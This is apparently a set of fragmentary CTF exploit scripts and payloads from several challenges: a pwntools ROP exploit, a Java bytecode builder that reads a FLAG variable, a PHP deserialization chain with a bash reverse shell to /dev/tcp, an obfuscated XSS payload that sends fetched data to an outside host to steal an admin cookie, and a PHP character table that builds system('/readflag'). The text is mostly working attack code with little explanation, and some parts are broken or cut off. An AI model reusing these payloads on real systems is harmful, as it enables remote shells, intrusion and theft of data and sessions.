        r = remote('129.211.134.166', 6000)
        read_got = 0x600FD8
        bss = 0x601078
        pop_rbp = 0x400588
        leave_ret = 0x40067c
        ##stack bss
        payload = b'a'*0x18+call_func(read_got,0,bss,0x580)+p64(pop_rbp) + 
p64(bss+0x4f8) + p64(leave_ret)
        sd(payload)
        ##__libc_start_main
        pop_rdi = 0x400773
        pop_rsp = 0x40076d
        syscall = 0x6014d8
        payload1 = b"flag"
        #payload1 = b"./flag"
        payload1 += b'\x00'*(0x38-len(payload1))
        payload1 += call_func(read_got,0,syscall,0x1)
        payload1 += call_func(read_got,0,bss+0x580,0x2)
        payload1 += call_func(syscall,bss,0,0)
        flag_addr = 0x601318
        payload1 += call_func(read_got,3,bss+0x580,len(flag))
        payload1 += call_func(read_got,3,flag_addr,0x1)
        payload1 += p64(0x040076A)+p64(i)+p64(0)*5
        payload1 += p64(0x40075D)+p64(0)*7
        payload1 += call_func(read_got,0,bss+0x580,0x10)*2
        payload1 += b'\x00'*(0x480-len(payload1))
        payload1 += p64(pop_rsp)+p64(0)*0xf + 
call_func(0x600FF0,pop_rdi,0,bss+0x20)
        payload1 += b'a'*(0x580-len(payload1))
        sd(payload1)
        sd(b'\x7f')
        sd(b'a'*2)
        try:
            sleep(1)
0c
            r.send("a"*0x10)
            r.recv(1,timeout=2)
            flag += chr(i+1)
            r.close()
            break
        except:
            i += 1
            try:
                r.close()
            except:
                pass
        print(i)
        print(flag)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import struct
code = "'getenv'; '(Ljava/lang/String;)Ljava/lang/String;'; 
'([Ljava/lang/String;)V'; 'main'; 'SourceDebugExtension'; 'FLAG'"
code += "print('getenv');"
def c_str(s):
  r = ''
  for c in s:
    r += '\\x%02x' % (ord(c))
  return r
# pool
codestr = ""  # this starts at #28
codestr += "\x0c\x00\x13\x00\x15"   # name & type: Stringgetenv(String): #29
codestr += "\x0a\x00\x06\x00\x22"   # method ref: java.lang.System:getenv  #30
codestr += "\x0c\x00\x13\x00\x15"   # name & type: Stringgetenv(String): #29
codestr += "\x00\x21"   # access flag
codestr += "\x00\x02"   # this class
codestr += "\x00\x04"   # super class
codestr += "\x00\x00" * 2   # iface, field cnt
# method
codestr += "\x00\x01"   # method count
codestr += "\x00\x09"   # access: static public
codestr += "\x00\x19"   # name: main
codestr += "\x00\x17"   # desc
codestr += "\x00\x01"   # attribute count
WEB
swoole
fixup = 4
cc = ""
cc += '\x12\x1e'  # load FLAG
cc += "\x05\x36"  # fix utf-8: iconst_5; istore 0xc2
cc += '\xb8\x00\x23' # invokestatic
cc += '\x4b'  # astore_0
cc += "\x05\x36"  # fix utf-8: iconst_5; istore 0xc2
cc += '\xb2\x00\x0a' # getstatic
cc += '\x2a'  # aload_0
cc += '\x05\x36'  # fix utf-8
cc += '\xb6\x00\x10' # invokevirtual
cc += "\x05\x36"  # fix utf-8 for return: iconst_5; istore 0xc2
cc += "\xb1"  # return 
# code attribute
codestr += "\x00\x12"   # name: Code
codestr += "\x00\x00\x00\x26"   # length
codestr += "\x01\x00"   # max stack
codestr += "\x01\x00"   # max local
codestr += "\x00\x00\x00\x1a"   # code len
codestr += cc 
codestr += "\x00\x00"   # exc table count
codestr += "\x00\x00"   # attrib count
# SDE attrib to remove padding bytes
codestr += "\x00\x01"   # attrib count
codestr += "\x00\x1b"   # attrib name
codestr += "\x00\x00\x00\x7d"
exploit = "\xff" * len(codestr) + codestr 
code += "\'%s\';" % c_str(exploit)
code += "'pad';"
open("./code.txt", 'wb').write(code)
// Bug site: 
include('Handler.php');
// 
// delete(L309-L319) and change class name to Handlep
function process_serialized($serialized)
    {
        $new = '';
        $last = 0;
        $current = 0;
        $pattern = '#\bs:([0-9]+):"#';
        while(
            $current  $p_end_string + 2 &&
                substr($serialized, $p_end_string, 2) == '";'
            ))
            {
                $current = $p_start_string;
                continue;
            }
            $string = substr($serialized, $p_start_string, $length);
            # Convert every special character to its S representation
            $clean_string = '';
            for($i=0; $i "); //GWF
$o->setOpt(CURLOPT_READFUNCTION,"array_walk");
$o->setOpt(CURLOPT_FILE, "array_walk");
$o->exec = array('/bin/bash -c "bash -i >& /dev/tcp/xxxxxxx/9999 0>&1"');
$o->setOpt(CURLOPT_POST,1);
$o->setOpt(CURLOPT_POSTFIELDS,"aaa");
$o->setOpt(CURLOPT_HTTPHEADER,["Content-type"=>"application/json"]);
$o->setOpt(CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);
$a = serialize([$o,'exec']);
echo str_replace("Handlep","Handler",urlencode(process_serialized($a)));
205f4402-efeb-4200-97a8-808a3159157f
    ?aaa=2:2;
eval(String.fromCharCode(118,97,114,32,120,104,114,32,61,32,110,101,119,32,88,7
7,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,10,32,32,32,32,120,104,
114,46,111,112,101,110,40,34,71,69,84,34,44,34,104,116,116,112,115,58,47,47,114
,98,108,111,103,46,114,99,116,102,50,48,50,48,46,114,111,105,115,46,105,111,47,
112,111,115,116,115,47,102,108,97,103,34,44,102,97,108,115,101,41,59,10,32,32,3
2,32,120,104,114,46,115,101,110,100,40,41,59,10,32,32,32,32,118,97,114,32,114,1
01,115,112,32,61,32,120,104,114,46,114,101,115,112,111,110,115,101,84,101,120,1
16,59,10,32,32,32,32,108,111,99,97,116,105,111,110,46,104,114,101,102,32,61,32,
34,104,116,116,112,58,47,47,120,115,115,46,101,98,99,101,99,101,48,56,46,110,48
,112,46,99,111,47,63,100,97,116,97,61,34,43,101,115,99,97,112,101,40,114,101,11
5,112,41,59));
        `&highlight=.|$%26iframe+onload=eval(1%2bu.search)+&a=`;#aa
//String.fromCharCode(...)
/*
var xhr = new XMLHttpRequest();
    xhr.open("GET","https://rblog.rctf2020.rois.io/posts/flag",false);
    xhr.send();
    var resp = xhr.responseText;
    location.href = "http://ip:port/?data="+escape(resp);
*/
EasyBlog
http://124.156.134.92:8081/?page=show&id=0e65a36c-8369-4ae9-bb32-60119d4e2d06%26cb=ale
rt(1)//
1. comment 
2. visit
POST /posts/feedback HTTP/1.1
Host: rblog.rctf2020.rois.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) 
Gecko/20100101 Firefox/56.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1422
X-REAL-IP: 10.11.11.11
Cookie: 
csrftoken=U9H3LbqKHgkW7lETaQhcpb3QBTgvQEreVfvKK6bTMdArAPwvsi9qReure5AZVKGp
Connection: close
postid=205f4402-efeb-4200-97a8-
808a3159157f%3Faaa%3D2%3A2%3Beval%28String.fromCharCode%28118%2C97%2C114%2C32%2
C120%2C104%2C114%2C32%2C61%2C32%2C110%2C101%2C119%2C32%2C88%2C77%2C76%2C72%2C11
6%2C116%2C112%2C82%2C101%2C113%2C117%2C101%2C115%2C116%2C40%2C41%2C59%2C10%2C32
%2C32%2C32%2C32%2C120%2C104%2C114%2C46%2C111%2C112%2C101%2C110%2C40%2C34%2C71%2
C69%2C84%2C34%2C44%2C34%2C104%2C116%2C116%2C112%2C115%2C58%2C47%2C47%2C114%2C98
%2C108%2C111%2C103%2C46%2C114%2C99%2C116%2C102%2C50%2C48%2C50%2C48%2C46%2C114%2
C111%2C105%2C115%2C46%2C105%2C111%2C47%2C112%2C111%2C115%2C116%2C115%2C47%2C102
%2C108%2C97%2C103%2C34%2C44%2C102%2C97%2C108%2C115%2C101%2C41%2C59%2C10%2C32%2C
32%2C32%2C32%2C120%2C104%2C114%2C46%2C115%2C101%2C110%2C100%2C40%2C41%2C59%2C10
%2C32%2C32%2C32%2C32%2C118%2C97%2C114%2C32%2C114%2C101%2C115%2C112%2C32%2C61%2C
32%2C120%2C104%2C114%2C46%2C114%2C101%2C115%2C112%2C111%2C110%2C115%2C101%2C84%
2C101%2C120%2C116%2C59%2C10%2C32%2C32%2C32%2C32%2C108%2C111%2C99%2C97%2C116%2C1
05%2C111%2C110%2C46%2C104%2C114%2C101%2C102%2C32%2C61%2C32%2C34%2C104%2C116%2C1
16%2C112%2C58%2C47%2C47%2C120%2C115%2C115%2C46%2C101%2C98%2C99%2C101%2C99%2C101
%2C48%2C56%2C46%2C110%2C48%2C112%2C46%2C99%2C111%2C47%2C63%2C100%2C97%2C116%2C9
7%2C61%2C34%2C43%2C101%2C115%2C99%2C97%2C112%2C101%2C40%2C114%2C101%2C115%2C112
%2C41%2C59%29%29%3B%60%26highlight%3D.%7C%24%2526iframe%2bonload%3Deval%281%252
bu.search%29%2b%26a%3D%60%3B%23aa%27&highlight='
http://124.156.134.92:8081/?page=show&id=e9e23517-64a0-49c8-bbe6-1065408d38c5%26cb=ev
al(a.value)//&id=e9e23517-64a0-49c8-bbe6-1065408d38c5
3. steal admin's cookie
Calc
$table = [
    "0" => "(0).(1){1}",
    "1" => "(1).(1){1}",
    "2" => "(2).(1){1}",
    "3" => "(3).(1){1}",
    "4" => "(4).(1){1}",
    "5" => "(5).(1){1}",
    "6" => "(6).(1){1}",
    "7" => "(7).(1){1}",
    "8" => "(8).(1){1}",
    "9" => "(9).(1){1}",
    "I" => "((1/0).(1)){0}",
    "N" => "((1/0).(1)){1}",
    "F" => "((1/0).(1)){2}",
    "y" => "((0).(1){1})|(((1/0).(1)){0})",
    "~" => "((0).(1){1})|(((1/0).(1)){1})",
    "v" => "((0).(1){1})|(((1/0).(1)){2})",
    "w" => "((1).(1){1})|(((1/0).(1)){2})",
    ":" => "((2).(1){1})|((8).(1){1})",
    ";" => "((2).(1){1})|((9).(1){1})",
    "{" => "((2).(1){1})|(((1/0).(1)){0})",
    " "((4).(1){1})|((8).(1){1})",
    "=" => "((4).(1){1})|((9).(1){1})",
    "}" => "((4).(1){1})|(((1/0).(1)){0})",
    ">" => "((6).(1){1})|((8).(1){1})",
    "?" => "((6).(1){1})|((9).(1){1})",
    "H" => "(((1/0).(1)){0})&(((1/0).(1)){1})",
    "@" => "(((1/0).(1)){0})&(((1/0).(1)){2})",
    "O" => "(((1/0).(1)){0})|(((1/0).(1)){1})",
    "x" => "((0).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){1}))",
    "p" => "((0).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))",
    "q" => "((1).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))",
    "z" => "((2).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){1}))",
    "r" => "((2).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))",
    "s" => "((3).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))",
    "|" => "((4).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){1}))",
    "t" => "((4).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))",
    "u" => "((5).(1){1})|((((1/0).(1)){0})&(((1/0).(1)){2}))",
    "A" => "(((1/0).(1)){0})&(((1).(1){1})|(((1/0).(1)){2}))",
    "J" => "(((1/0).(1)){1})&(((2).(1){1})|(((1/0).(1)){0}))",
system('/readflag')
    "L" => "(((1/0).(1)){1})&(((4).(1){1})|(((1/0).(1)){0}))",
    "B" => "(((1/0).(1)){2})&(((2).(1){1})|(((1/0).(1)){0}))",